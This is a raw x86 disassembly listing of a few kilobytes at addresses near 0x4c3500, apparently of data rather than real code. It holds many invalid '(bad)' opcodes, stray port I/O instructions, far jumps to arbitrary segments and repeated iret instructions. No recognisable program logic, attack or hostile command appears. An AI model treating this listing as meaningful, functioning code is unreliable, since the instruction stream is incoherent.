  4c345b:	sub    ebx,DWORD PTR [eax]
  4c345d:	arpl   WORD PTR [esi+ebx*4],sp
  4c3460:	ret    0x2649
  4c3463:	jbe    0x4c33ef
  4c3465:	xchg   ecx,eax
  4c3466:	fiadd  DWORD PTR [eax]
  4c3468:	aaa    
  4c3469:	xchg   edx,eax
  4c346a:	dec    ecx
  4c346b:	dec    ebx
  4c346c:	xchg   ebp,eax
  4c346d:	out    dx,al
  4c346e:	pop    ebp
  4c346f:	mov    esi,0x5950005f
  4c3474:	adc    ebx,DWORD PTR [edx-0x5d]
  4c3477:	fmul   DWORD PTR [edx]
  4c3479:	mov    ch,0xd8
  4c347b:	inc    edi
  4c347c:	xchg   edi,eax
  4c347d:	ja     0x4c3445
  4c347f:	ror    DWORD PTR [esi+0x2f56fa91],1
  4c3485:	dec    esi
  4c3486:	in     eax,0x60
  4c3488:	mov    al,ds:0x2e561fe9
  4c348d:	fimul  DWORD PTR [ebp+0x6d]
  4c3490:	lds    ebp,FWORD PTR [eax-0x75]
  4c3493:	sbb    ah,BYTE PTR [edi]
  4c3495:	and    ebp,DWORD PTR [edi]
  4c3497:	mov    eax,0x4d1c1cbb
  4c349c:	sbb    dl,BYTE PTR [edx+eax*2-0x32]
  4c34a0:	inc    esi
  4c34a1:	push   cs
  4c34a2:	je     0x4c3493
  4c34a4:	adc    DWORD PTR [ebx+0x32],esp
  4c34a7:	dec    eax
  4c34a8:	sbb    bh,BYTE PTR [edi]
  4c34aa:	xor    eax,0x37d48ebe
  4c34af:	inc    edx
  4c34b0:	inc    ecx
  4c34b1:	(bad)  
  4c34b2:	push   edx
  4c34b3:	add    ah,BYTE PTR [esp+edx*8]
  4c34b6:	xchg   ebp,eax
  4c34b7:	mov    esp,0x8b535346
  4c34bc:	fimul  DWORD PTR [edx]
  4c34be:	push   esi
  4c34bf:	cmp    ebp,DWORD PTR [esi]
  4c34c1:	xchg   edi,ebx
  4c34c3:	aaa    
  4c34c4:	call   0xb46:0xe3b06bd1
  4c34cb:	and    edi,edi
  4c34cd:	call   0xf804143c
  4c34d2:	push   edi
  4c34d3:	mov    edi,0x72423f44
  4c34d8:	dec    eax
  4c34d9:	mov    ds:0xbf4bbf1a,eax
  4c34de:	out    dx,eax
  4c34df:	jecxz  0x4c34c9
  4c34e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c34e2:	pop    esi
  4c34e3:	imul   BYTE PTR [ebx-0x753a28ae]
  4c34e9:	push   ds
  4c34ea:	jl     0x4c355a
  4c34ec:	inc    ebp
  4c34ed:	add    edx,DWORD PTR [edx-0xd]
  4c34f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c34f1:	in     eax,dx
  4c34f2:	sub    eax,0x521fd8ba
  4c34f7:	repz aaa 
  4c34f9:	pop    ss
  4c34fa:	arpl   bp,bp
  4c34fc:	inc    esi
  4c34fd:	je     0x4c3551
  4c34ff:	jecxz  0x4c352f
  4c3501:	pop    ss
  4c3502:	inc    ebp
  4c3503:	ror    bl,1
  4c3505:	cwde   
  4c3506:	jae    0x4c355b
  4c3508:	xlat   BYTE PTR ds:[ebx]
  4c3509:	pop    ecx
  4c350a:	pop    es
  4c350b:	inc    edx
  4c350c:	ds pop edx
  4c350e:	mov    edi,DWORD PTR [edi+0x56]
  4c3511:	daa    
  4c3512:	dec    edi
  4c3513:	add    BYTE PTR [ebp+eax*8-0x22],dl
  4c3517:	(bad)  
  4c3518:	out    dx,eax
  4c3519:	push   ebx
  4c351a:	push   ss
  4c351b:	inc    edx
  4c351c:	daa    
  4c351d:	push   edi
  4c351e:	daa    
  4c351f:	jbe    0x4c34d2
  4c3521:	add    ecx,DWORD PTR [ebx+0x392f1f83]
  4c3527:	pop    ds
  4c3528:	cs in  al,0x42
  4c352b:	cmp    BYTE PTR cs:[edi],dh
  4c352e:	ss inc edx
  4c3530:	cs in  al,0x42
  4c3533:	xor    eax,0x2e42e434
  4c3538:	in     al,0x33
  4c353a:	xor    dh,BYTE PTR [ecx]
  4c353c:	ds sbb al,0xbe
  4c353f:	xor    BYTE PTR cs:[edi],bh
  4c3542:	xor    dh,bl
  4c3544:	dec    edi
  4c3545:	mov    eax,0x3f28d358
  4c354a:	and    ecx,DWORD PTR [edi-0xa724a55]
  4c3550:	imul   ecx,DWORD PTR [ebx+0x77],0x53
  4c3554:	lahf   
  4c3555:	push   edx
  4c3556:	xor    BYTE PTR [ebp+0x2b4c7747],0xf7
  4c355d:	(bad)  [edi+0x5b]
  4c3560:	add    edi,eax
  4c3562:	scas   eax,DWORD PTR es:[edi]
  4c3563:	push   edx
  4c3564:	pop    ss
  4c3565:	push   esp
  4c3566:	jae    0x4c35b1
  4c3568:	or     esi,eax
  4c356a:	push   ss
  4c356b:	(bad)  
  4c356c:	xor    edx,DWORD PTR [edi-0x11]
  4c356f:	dec    ecx
  4c3570:	adc    edi,0xffffffbb
  4c3573:	inc    edx
  4c3574:	scas   eax,DWORD PTR es:[edi]
  4c3575:	add    cl,bl
  4c3577:	arpl   WORD PTR [esi],si
  4c3579:	fstp   TBYTE PTR [esi+0x54f2478b]
  4c357f:	jg     0x4c35c8
  4c3581:	push   edi
  4c3582:	pop    ss
  4c3583:	inc    esp
  4c3584:	(bad)  
  4c3585:	sti    
  4c3586:	jo     0x4c356b
  4c3588:	cmp    BYTE PTR [ebp+0x2f],al
  4c358b:	mov    edi,0x1c3d1fe7
  4c3590:	dec    esp
  4c3591:	pop    es
  4c3592:	add    BYTE PTR [edi+0x46],dh
  4c3595:	adc    dh,BYTE PTR [edx]
  4c3597:	fbld   TBYTE PTR [edx+0x39]
  4c359a:	mov    ecx,0x4230310f
  4c359f:	(bad)  
  4c35a2:	daa    
  4c35a3:	daa    
  4c35a4:	daa    
  4c35a5:	aaa    
  4c35a6:	ss xor eax,0x27635334
  4c35ac:	daa    
  4c35ad:	xor    esi,DWORD PTR [edx]
  4c35af:	scas   eax,DWORD PTR es:[edi]
  4c35b0:	mov    ch,BYTE PTR [esi+0x538ff0dd]
  4c35b6:	scas   eax,DWORD PTR es:[edi]
  4c35b7:	inc    ebp
  4c35b8:	pop    ds
  4c35b9:	add    bh,dl
  4c35bb:	pop    edx
  4c35bc:	add    eax,0x6f17de3e
  4c35c1:	das    
  4c35c2:	push   ss
  4c35c3:	imul   esi,DWORD PTR [edi+0x70],0x1a
  4c35c7:	xchg   edi,eax
  4c35c8:	inc    esi
  4c35c9:	pop    ds
  4c35ca:	pop    es
  4c35cb:	xor    al,0x18
  4c35cd:	ss mov ebp,0x3f871f53
  4c35d3:	sbb    al,0x7c
  4c35d5:	addps  xmm6,xmm3
  4c35d8:	mov    ecx,DWORD PTR [edi]
  4c35da:	inc    esi
  4c35db:	sahf   
  4c35dc:	add    cl,ah
  4c35de:	loope  0x4c35fd
  4c35e0:	jmp    0x8f70:0xbfa70b03
  4c35e7:	js     0x4c35c7
  4c35e9:	xchg   edx,eax
  4c35ea:	pop    edi
  4c35eb:	pop    esi
  4c35ec:	jae    0x4c3645
  4c35ee:	fnstsw WORD PTR [edx-0x1f]
  4c35f1:	or     bh,dh
  4c35f3:	push   cs
  4c35f4:	push   edi
  4c35f5:	dec    ebp
  4c35f6:	adc    eax,0x6ec78956
  4c35fb:	push   eax
  4c35fc:	jne    0x4c35cc
  4c35fe:	cmp    edx,eax
  4c3600:	cmp    ecx,DWORD PTR [edi-0x36]
  4c3603:	popa   
  4c3604:	imul   ax,WORD PTR [ebx],0xffd4
  4c3608:	lods   eax,DWORD PTR ds:[esi]
  4c3609:	xor    dl,bl
  4c360b:	add    DWORD PTR [ecx-0x59],esi
  4c360e:	(bad)  [eax+0x5fe7c60d]
  4c3614:	push   ss
  4c3615:	adc    ah,dl
  4c3617:	sbb    ebx,ecx
  4c3619:	jo     0x4c361a
  4c361b:	div    DWORD PTR [eax-0x74]
  4c361e:	dec    ecx
  4c361f:	xor    esp,DWORD PTR [edx]
  4c3621:	or     bl,BYTE PTR [ebx+0x28]
  4c3624:	test   DWORD PTR [edi],edx
  4c3626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c3627:	sti    
  4c3628:	add    eax,DWORD PTR [ebx]
  4c362a:	mov    cl,0x31
  4c362c:	xchg   BYTE PTR [di+0x4],bl
  4c3630:	add    DWORD PTR [ebx+ecx*1],eax
  4c3633:	sbb    DWORD PTR [ebp-0xd],ebp
  4c3636:	adc    eax,0x505824b
  4c363b:	and    DWORD PTR [ecx],esp
  4c363d:	add    BYTE PTR [esi],al
  4c363f:	add    eax,DWORD PTR [ecx]
  4c3641:	fistp  WORD PTR [ebp+0x50537bb]
  4c3647:	add    BYTE PTR [edi+0x131c02],dh
  4c364d:	iret   
  4c364e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c364f:	repnz mov esi,0x7fff67f
  4c3655:	push   es
  4c3656:	call   FWORD PTR [edi]
  4c3658:	inc    DWORD PTR [ebx]
  4c365a:	jg     0x4c3698
  4c365c:	outs   dx,DWORD PTR ds:[esi]
  4c365d:	or     ah,BYTE PTR [ecx+0x6e08f06]
  4c3663:	lock clc 
  4c3665:	xor    DWORD PTR [ecx+0x4f],esi
  4c3668:	loop   0x4c3658
  4c366a:	push   esp
  4c366b:	pop    edi
  4c366c:	lods   al,BYTE PTR ds:[esi]
  4c366d:	xchg   ecx,eax
  4c366e:	inc    esi
  4c366f:	mov    ds:0x107460f,al
  4c3674:	sub    eax,0x387ff9be
  4c3679:	dec    ebp
  4c367a:	inc    ecx
  4c367b:	push   edx
  4c367c:	dec    ebx
  4c367d:	add    BYTE PTR [ecx+0x43],al
  4c3680:	inc    ebx
  4c3681:	inc    ebp
  4c3682:	push   eax
  4c3683:	dec    edi
  4c3684:	dec    ebp
  4c3685:	dec    ebp
  4c3686:	dec    ecx
  4c3687:	push   esp
  4c3688:	adc    eax,DWORD PTR [ecx-0x3e]
  4c368b:	(bad)  
  4c368c:	mov    eax,DWORD PTR [eax+0x55524849]
  4c3692:	dec    esi
  4c3693:	add    al,0x4b
  4c3695:	dec    ecx
  4c3696:	in     al,0xa2
  4c3698:	pop    ebp
  4c3699:	in     al,dx
  4c369a:	jle    0x4c36e4
  4c369c:	inc    ebp
  4c369d:	dec    esp
  4c369e:	add    DWORD PTR [ecx],eax
  4c36a0:	add    ah,ah
  4c36a2:	jns    0x4c36f2
  4c36a4:	add    eax,DWORD PTR cs:[eax*1-0x2a368e00]
  4c36ac:	scas   al,BYTE PTR es:[edi]
  4c36ad:	add    DWORD PTR [edi],eax
  4c36af:	add    al,BYTE PTR [ebx]
  4c36b1:	pop    ss
  4c36b2:	jb     0x4c3639
  4c36b4:	pop    esp
  4c36b5:	add    al,0x5
  4c36b7:	push   es
  4c36b8:	xchg   ebp,eax
  4c36b9:	inc    eax
  4c36ba:	repz and eax,0x72796e41
  4c36c0:	fsub   QWORD PTR [ebx+0x74]
  4c36c3:	bound  esi,QWORD PTR ds:0x69f60c70
  4c36c9:	popa   
  4c36ca:	pop    edx
  4c36cb:	jbe    0x4c373f
  4c36cd:	add    cl,bh
  4c36cf:	or     DWORD PTR [esi+ecx*1],esp
  4c36d2:	inc    edx
  4c36d3:	dec    eax
  4c36d4:	scas   al,BYTE PTR es:[edi]
  4c36d5:	fldcw  WORD PTR [edi+0x10650803]
  4c36db:	ins    DWORD PTR es:[edi],dx
  4c36dc:	jne    0x4c374b
  4c36de:	or     bh,BYTE PTR [edx]
  4c36e0:	and    ch,BYTE PTR [bp+si]
  4c36e3:	mov    ah,0x4b
  4c36e5:	fisttp WORD PTR [esi]
  4c36e7:	outs   dx,DWORD PTR ds:[esi]
  4c36e8:	jo     0x4c3759
  4c36ea:	ins    DWORD PTR es:[edi],dx
  4c36eb:	outs   dx,DWORD PTR ds:[esi]
  4c36ec:	xchg   esi,eax
  4c36ed:	inc    edx
  4c36ee:	jb     0x4c3752
  4c36f0:	ins    BYTE PTR es:[edi],dx
  4c36f1:	sbb    al,0xfd
  4c36f3:	pop    ebx
  4c36f4:	call   0x759bb535
  4c36f9:	push   0x43886469
  4c36fe:	fscale 
  4c3700:	push   edi
  4c3701:	and    DWORD PTR [esi+0x64],esp
  4c3704:	xchg   edx,eax
  4c3705:	pop    edi
  4c3706:	inc    ecx
  4c3707:	bound  ebp,QWORD PTR [edi+0x72]
  4c370a:	imul   edi,DWORD PTR [eax],0xda6b3f6c
  4c3710:	out    dx,al
  4c3711:	es jb  0x4c36cb
  4c3714:	inc    ebx
  4c3715:	arpl   WORD PTR [esi+eiz*2],ax
  4c3718:	push   0x726508a2
  4c371d:	outs   dx,DWORD PTR ds:[esi]
  4c371e:	mov    bl,0xf7
  4c3720:	cmp    ah,BYTE PTR [eax+0x2c430e6b]
  4c3726:	outs   dx,DWORD PTR ds:[esi]
  4c3727:	add    al,0x6d
  4c3729:	stos   BYTE PTR es:[edi],al
  4c372a:	adc    esp,DWORD PTR [eax]
  4c372c:	repz or al,0x90
  4c372f:	lods   al,BYTE PTR ds:[esi]
  4c3730:	dec    eax
  4c3731:	jae    0x4c36d3
  4c3733:	ss adc al,0x8a
  4c3736:	cld    
  4c3737:	imul   esi,DWORD PTR [eax],0xbdc27912
  4c373d:	jnp    0x4c36da
  4c373f:	add    ch,BYTE PTR [edi+0x74]
  4c3742:	push   cs
  4c3743:	jb     0x4c3725
  4c3745:	cmp    al,BYTE PTR [edx+ebx*8-0x46]
  4c3749:	xchg   eax,esi
  4c374b:	or     al,0x98
  4c374d:	push   cs
  4c374e:	jbe    0x4c378c
  4c3750:	mov    ah,0x7d
  4c3752:	and    eax,0x67e02ddc
  4c3757:	jns    0x4c37c9
  4c3759:	out    0xc4,al
  4c375b:	outs   dx,DWORD PTR ds:[esi]
  4c375c:	ins    BYTE PTR es:[di],dx
  4c375e:	adc    eax,DWORD PTR ds:[ebx]
  4c3761:	lods   eax,DWORD PTR ds:[esi]
  4c3762:	sbb    ch,BYTE PTR [eax-0x7c]
  4c3765:	inc    ebp
  4c3766:	push   eax
  4c3767:	sahf   
  4c3768:	pusha  
  4c3769:	inc    edi
  4c376a:	outs   dx,BYTE PTR gs:[esi]
  4c376c:	ins    DWORD PTR es:[di],dx
  4c376e:	xlat   BYTE PTR ds:[ebx]
  4c376f:	mov    fs,WORD PTR [edi-0x1]
  4c3772:	inc    edi
  4c3773:	ins    BYTE PTR es:[edi],dx
  4c3774:	pop    esp
  4c3775:	outs   dx,DWORD PTR ds:[esi]
  4c3776:	test   ch,al
  4c3778:	inc    edi
  4c3779:	outs   dx,DWORD PTR ds:[esi]
  4c377a:	cmp    dl,BYTE PTR [ecx-0x4a]
  4c377d:	jne    0x4c3767
  4c377f:	or     al,0xd2
  4c3781:	imul   ecx,DWORD PTR [edx],0x75
  4c3784:	push   0xffffff8a
  4c3786:	out    dx,eax
  4c3787:	pop    esp
  4c3788:	mov    dh,0x9d
  4c378a:	pop    eax
  4c378b:	adc    al,ah
  4c378d:	jne    0x4c37fa
  4c378f:	xor    BYTE PTR [edx+0x1367065a],bh
  4c3795:	fs or  ebx,esp
  4c3798:	jne    0x4c3806
  4c379a:	or     eax,0xe6f6f16
  4c379f:	lock loopne 0x4c373c
  4c37a2:	cdq    
  4c37a3:	add    DWORD PTR [edx+eax*8+0x26ee6752],eax
  4c37aa:	ror    DWORD PTR [esp+edx*1],0x10
  4c37ae:	ins    DWORD PTR es:[edi],dx
  4c37af:	cli    
  4c37b0:	pop    eax
  4c37b1:	mov    bl,0x55
  4c37b3:	add    DWORD PTR [edi+0x63de825f],eax
  4c37b9:	and    BYTE PTR [esi+0x68],ch
  4c37bc:	sub    BYTE PTR [ecx+eax*1-0x9],bl
  4c37c0:	je     0x4c3827
  4c37c2:	fs adc dl,bh
  4c37c5:	loopne 0x4c382f
  4c37c7:	fcmovne st,st(7)
  4c37c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c37ca:	ds push eax
  4c37cc:	popa   
  4c37cd:	push   0x2b6976ee
  4c37d2:	jb     0x4c380f
  4c37d4:	sti    
  4c37d5:	rcr    dh,1
  4c37d7:	add    cl,ah
  4c37d9:	dec    edx
  4c37da:	ss popa 
  4c37dc:	or     DWORD PTR [ebx-0x78],0x55de0c22
  4c37e3:	fadd   st(3),st
  4c37e5:	outs   dx,BYTE PTR ds:[esi]
  4c37e6:	and    BYTE PTR [ecx+0xe],0xc
  4c37ea:	imul   edx,eax,0x10
  4c37ed:	jns    0x4c383e
  4c37ef:	dec    esp
  4c37f0:	fcomp  st(3)
  4c37f2:	sbb    BYTE PTR [edi+0x4c],0x32
  4c37f6:	push   0xe1493266
  4c37fb:	mov    dh,0xb
  4c37fd:	fsubr  DWORD PTR [eax+0x6d]
  4c3800:	(bad)  
  4c3801:	dec    edx
  4c3802:	es add al,0x61
  4c3805:	outs   dx,DWORD PTR ds:[esi]
  4c3806:	push   es
  4c3807:	out    dx,al
  4c3808:	int    0x6e
  4c380a:	add    bh,ah
  4c380c:	or     ah,BYTE PTR [ebp+0x70]
  4c380f:	arpl   WORD PTR [esp+ecx*1+0x69],ax
  4c3813:	ins    DWORD PTR es:[edi],dx
  4c3814:	bound  esi,QWORD PTR [ebp+0xa]
  4c3817:	xor    al,0xed
  4c3819:	mov    ebp,0x5f5ca8cd
  4c381e:	inc    edx
  4c381f:	adc    BYTE PTR [ebx+0x1a],dh
  4c3822:	ins    BYTE PTR es:[edi],dx
  4c3823:	add    al,0x6d
  4c3825:	outs   dx,DWORD PTR ds:[esi]
  4c3826:	cmp    ch,bh
  4c3828:	shl    DWORD PTR ds:[esp+ebx*1+0x79],cl
  4c382d:	arpl   sp,si
  4c382f:	or     al,0x64
  4c3831:	ss cmp eax,ecx
  4c3834:	sbb    BYTE PTR [eax+eiz*1+0x4d4406c8],al
  4c383b:	arpl   WORD PTR [edx],dx
  4c383d:	mov    ebx,0x6504d381
  4c3842:	imul   ebx,DWORD PTR fs:[edi+0xe],0xc6707b82
  4c384a:	cmp    cl,BYTE PTR [ebp+0x42]
  4c384d:	fs jo  0x4c38c6
  4c3850:	add    eax,ebx
  4c3852:	not    BYTE PTR [edi+0x4c]
  4c3855:	outs   dx,BYTE PTR ds:[esi]
  4c3856:	ins    DWORD PTR es:[edi],dx
  4c3857:	scas   al,BYTE PTR es:[edi]
  4c3858:	add    BYTE PTR [esp+eax*1+0x6b],ah
  4c385c:	(bad)  ds:0x61545f1e
  4c3863:	dec    esi
  4c3864:	mov    ds:0xb86b4e64,al
  4c3869:	dec    esi
  4c386a:	retf   0x8215
  4c386d:	push   ss
  4c386e:	pop    ebx
  4c386f:	dec    esi
  4c3870:	or     cl,BYTE PTR [edi+0x67]
  4c3873:	ror    DWORD PTR [edi-0x3c],0xc6
  4c3877:	imul   edi,eax,0x6bdf8216
  4c387d:	imul   edx,DWORD PTR [eax],0x94495f64
  4c3883:	jb     0x4c389a
  4c3885:	push   eax
  4c3886:	adc    eax,0x4e119dfc
  4c388b:	nop
  4c388c:	pop    ss
  4c388d:	push   ebx
  4c388e:	outs   dx,DWORD PTR ds:[esi]
  4c388f:	jne    0x4c3829
  4c3891:	pop    edi
  4c3892:	sub    DWORD PTR [ebx+0x23031db8],0x54
  4c3899:	add    BYTE PTR [ebx+0x51],ch
  4c389c:	dec    esi
  4c389d:	loope  0x4c38f3
  4c389f:	inc    edx
  4c38a0:	xor    ecx,esi
  4c38a2:	or     dh,BYTE PTR [ebx-0x2]
  4c38a5:	push   cs
  4c38a6:	call   0x63d0:0x55a6
  4c38ac:	add    al,0x64
  4c38ae:	gs mov dx,0x183e
  4c38b3:	mov    ebp,0x7c7367c3
  4c38b8:	adc    BYTE PTR [edi+0x64],ch
  4c38bb:	xchg   ecx,eax
  4c38bc:	push   eax
  4c38bd:	imul   ebx,edx,0x4d30ae2
  4c38c3:	outs   dx,DWORD PTR ds:[esi]
  4c38c4:	out    0x52,al
  4c38c6:	gs push 0x6a
  4c38c9:	or     al,0x75
  4c38cb:	sub    eax,0x30e00716
  4c38d0:	add    al,0x32
  4c38d2:	and    al,0x66
  4c38d4:	xchg   DWORD PTR [esi+0x8],esp
  4c38d7:	in     eax,0xb2
  4c38d9:	popa   
  4c38da:	jbe    0x4c38e4
  4c38dc:	adc    al,0xa8
  4c38de:	or     DWORD PTR [edi+0x20683278],esi
  4c38e4:	sub    eax,eax
  4c38e6:	adc    BYTE PTR [edx+0x5a],ch
  4c38e9:	sbb    ebp,esp
  4c38eb:	push   cs
  4c38ec:	imul   eax,DWORD PTR [ebp*2-0x38fd491],0xffffffe2
  4c38f4:	mov    ebx,0x6c79531b
  4c38f9:	inc    esp
  4c38fa:	mov    ah,0x4e
  4c38fc:	fdiv   DWORD PTR [ecx-0x7fcc7498]
  4c3902:	sbb    dl,dl
  4c3904:	ins    BYTE PTR es:[edi],dx
  4c3905:	push   esp
  4c3906:	repnz shrd DWORD PTR [ebp+0x620e0637],edi,0x4a
  4c390f:	ja     0x4c397f
  4c3911:	stc    
  4c3912:	gs hlt 
  4c3914:	cld    
  4c3915:	sbb    edi,DWORD PTR [ebp+ecx*1+0x54]
  4c3919:	call   0x65b58f2f
  4c391e:	je     0x4c398d
  4c3920:	cmp    BYTE PTR [ebx+0xa584d50],al
  4c3926:	gs mov edx,0x1b6734da
  4c392c:	mov    eax,ds:0x5c0c8fb3
  4c3931:	imul   esp,DWORD PTR [edx+0x3c],0x70da34f2
  4c3938:	push   0xe
  4c393a:	data16 xor dl,BYTE PTR [edx+0x0]
  4c393e:	push   ebp
  4c393f:	and    BYTE PTR [esi-0x4d],0xd9
  4c3943:	jnp    0x4c3968
  4c3945:	push   esi
  4c3946:	cmp    bl,BYTE PTR [eax+0x32]
  4c3949:	push   es
  4c394a:	jo     0x4c39bf
  4c394c:	jae    0x4c39be
  4c394e:	xor    ch,BYTE PTR [ebp-0x1d887d4b]
  4c3954:	pop    ecx
  4c3955:	and    al,0x5a
  4c3957:	add    ch,BYTE PTR [esp+eax*1+0x70]
  4c395b:	cld    
  4c395c:	mov    esp,0xabe50757
  4c3961:	add    al,0xa
  4c3963:	or     eax,DWORD PTR [ecx]
  4c3965:	add    BYTE PTR [esp+edi*8],dl
  4c3968:	cld    
  4c3969:	cld    
  4c396a:	cld    
  4c396b:	dec    ebp
  4c396c:	add    BYTE PTR [edi*1+0x4e2500],bl
  4c3973:	sub    eax,DWORD PTR [edx]
  4c3975:	add    BYTE PTR [ebx],dh
  4c3977:	jmp    0x573c:0x32ebafbd
  4c397e:	inc    esp
  4c397f:	push   es
  4c3980:	add    eax,0xae044a
  4c3985:	imul   ebx
  4c3987:	out    0x53,al
  4c3989:	ja     0x4c39e0
  4c398b:	push   ss
  4c398c:	(bad)  
  4c398d:	imul   ecx,DWORD PTR [edx],0x3abed79d
  4c3993:	cmp    al,0x70
  4c3995:	cmp    DWORD PTR [eax-0x518965fd],0xffffff97
  4c399c:	and    DWORD PTR [eax+eax*4+0x7b],edx
  4c39a0:	pop    ebp
  4c39a1:	test   BYTE PTR [edx],ah
  4c39a3:	sbb    eax,0x56d76bc6
  4c39a8:	xchg   DWORD PTR [edx],ecx
  4c39aa:	add    cl,BYTE PTR [edx+0x4f20922]
  4c39b0:	out    dx,eax
  4c39b1:	xlat   BYTE PTR ds:[ebx]
  4c39b2:	scas   al,BYTE PTR es:[edi]
  4c39b3:	add    dl,dl
  4c39b5:	cwde   
  4c39b6:	push   ds
  4c39b7:	push   cs
  4c39b8:	fwait
  4c39b9:	push   es
  4c39ba:	add    BYTE PTR ds:[ebp-0x3030f4f6],ah
  4c39c1:	iret   
  4c39c2:	iret   
  4c39c3:	add    BYTE PTR [ebp+0xdb6000c],ch
  4c39c9:	add    BYTE PTR [esi+0x4fc9000e],bh
  4c39cf:	iret   
  4c39d0:	iret   
  4c39d1:	iret   
  4c39d2:	iret   
  4c39d3:	add    dh,bl
  4c39d5:	verr   di
  4c39d8:	adc    BYTE PTR [eax],al
  4c39da:	lock adc DWORD PTR [eax],eax
  4c39dd:	sti    
  4c39de:	adc    ah,bh
  4c39e0:	out    0xe7,eax
  4c39e2:	out    0x0,al
  4c39e4:	add    al,BYTE PTR [ecx]
  4c39e6:	adc    eax,DWORD PTR [eax]
  4c39e8:	or     BYTE PTR [eax+eax*1],dl
  4c39eb:	adc    DWORD PTR ds:0xe7e71a00,edx
  4c39f1:	out    0xe7,eax
  4c39f3:	push   ss
  4c39f4:	add    BYTE PTR [esi],bl
  4c39f6:	pop    ss
  4c39f7:	add    BYTE PTR ds:0x192d0018,ah
  4c39fd:	add    BYTE PTR [edi+eiz*8],dh
  4c3a00:	out    0xe7,eax
  4c3a02:	out    0x1a,eax
  4c3a04:	add    BYTE PTR ds:0x1b4e0050,bh
  4c3a0a:	add    BYTE PTR [eax+0x51],bl
  4c3a0d:	add    BYTE PTR [esi-0x19],ch
  4c3a10:	out    0xe7,eax
  4c3a12:	out    0x52,eax
  4c3a14:	add    BYTE PTR [ebp+0x548e0053],al
  4c3a1a:	add    BYTE PTR [ebp-0x762ffe4],dl
  4c3a20:	out    0xe7,eax
  4c3a22:	out    0x1d,eax
  4c3a24:	add    BYTE PTR [esi+0x1eaf0044],ah
  4c3a2a:	add    BYTE PTR [edx+0x1c0001f],bh
  4c3a30:	add    cl,BYTE PTR [edi-0x10]
  4c3a33:	sahf   
  4c3a34:	or     eax,0xc501c286
  4c3a39:	and    ah,BYTE PTR [eax]
  4c3a3b:	inc    edx
  4c3a3c:	or     ah,BYTE PTR [ecx]
  4c3a3e:	into   
  4c3a3f:	iret   
  4c3a40:	iret   
  4c3a41:	iret   
  4c3a42:	add    bh,cl
  4c3a44:	inc    ebp
  4c3a45:	add    dh,dl
  4c3a47:	and    al,BYTE PTR [eax]
  4c3a49:	fsub   QWORD PTR [ebx]
  4c3a4b:	add    ch,ah
  4c3a4d:	aas    
  4c3a4e:	mov    edi,0xea3a1b87
  4c3a53:	add    DWORD PTR [ebx],eax
  4c3a55:	(bad)  
  4c3a56:	in     eax,dx
  4c3a57:	or     al,BYTE PTR [esi]
  4c3a59:	add    al,dh
  4c3a5b:	pop    es
  4c3a5c:	add    bl,dh
  4c3a5e:	test   DWORD PTR [ebx+0x38],ebp
  4c3a61:	aas    
  4c3a62:	or     BYTE PTR [eax],al
  4c3a64:	test   BYTE PTR [esi],0xf9
  4c3a67:	inc    esi
  4c3a68:	test   DWORD PTR [esp+esi*4+0x56],0x470a0222
  4c3a70:	xor    al,BYTE PTR [edx]
  4c3a72:	repnz or DWORD PTR [esi],edx
  4c3a75:	xor    eax,0x2482c3dc
  4c3a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c3a7b:	add    al,BYTE PTR [ebx]
  4c3a7d:	ds push ss
  4c3a7f:	or     ah,BYTE PTR [esi]
  4c3a81:	sbb    DWORD PTR [edi+0x22fbf38a],edi
  4c3a87:	push   esi
  4c3a88:	add    BYTE PTR [esi],ah
  4c3a8a:	push   ss
  4c3a8b:	or     al,0x0
  4c3a8d:	sub    DWORD PTR [esi],esi
  4c3a8f:	xor    ebx,DWORD PTR [esi+0x26]
  4c3a92:	add    BYTE PTR [ebx],bh
  4c3a94:	test   eax,0x263b5f9e
  4c3a99:	cmp    eax,0x40000d2e
  4c3a9e:	daa    
  4c3a9f:	push   es
  4c3aa0:	in     al,dx
  4c3aa1:	xor    eax,0x3f0ae09c
  4c3aa6:	mov    esi,0xa536e22
  4c3aab:	movd   mm7,ecx
  4c3aae:	stc    
  4c3aaf:	stc    
  4c3ab0:	std    
  4c3ab1:	and    ch,BYTE PTR [eax]
  4c3ab3:	add    BYTE PTR [edx+ecx*1+0x48],bl
  4c3ab7:	add    BYTE PTR [ebp+0x29],ah
  4c3aba:	add    BYTE PTR [eax+0x2a],dh
  4c3abd:	add    BYTE PTR [ebx+esi*8-0xd],bh
  4c3ac1:	sti    
  4c3ac2:	stc    
  4c3ac3:	push   edi
  4c3ac4:	add    BYTE PTR [esi-0x5966ffa8],cl
  4c3aca:	sub    eax,DWORD PTR [eax]
  4c3acc:	lahf   
  4c3acd:	sub    al,0x0
  4c3acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c3ad0:	out    0xe7,eax
  4c3ad2:	xchg   bl,dh
  4c3ad4:	add    al,0x0
  4c3ad6:	test   eax,0x302acce
  4c3adb:	scas   eax,DWORD PTR es:[edi]
  4c3adc:	add    al,BYTE PTR [ebx]
  4c3ade:	rcl    DWORD PTR [ebx-0x44],0xe7
  4c3ae2:	mov    dl,0x2
  4c3ae4:	add    esi,DWORD PTR [ebp+0xa2e4046]
  4c3aea:	inc    ecx
  4c3aeb:	jmp    0xe622:0x386e7e7b
  4c3af2:	int3   
  4c3af3:	add    al,BYTE PTR [ebx]
  4c3af5:	iret   
  4c3af6:	add    al,BYTE PTR [ebx]
  4c3af8:	ror    BYTE PTR [esi-0xc0c7d41],cl
  4c3afe:	dec    ecx
  4c3aff:	add    cl,bl
  4c3b01:	sub    eax,0xe1eadf00
  4c3b06:	push   ss
  4c3b07:	pop    ecx
  4c3b08:	add    bl,ch
  4c3b0a:	js     0x4c3ab2
  4c3b0c:	sub    DWORD PTR [eax+0xa],edi
  4c3b0f:	dec    edx
  4c3b10:	fiadd  WORD PTR [edx]
  4c3b12:	pop    ss
  4c3b13:	push   ss
  4c3b14:	cs lahf 
  4c3b16:	lahf   
  4c3b17:	scas   eax,DWORD PTR es:[edi]
  4c3b18:	push   0x2f3a037e
  4c3b1d:	add    BYTE PTR [ecx],cl
  4c3b1f:	add    eax,DWORD PTR [ebx]
  4c3b21:	or     al,0x3
  4c3b23:	add    ecx,DWORD PTR [edi]
  4c3b25:	add    ecx,esi
  4c3b27:	iret   
  4c3b28:	lock sahf 
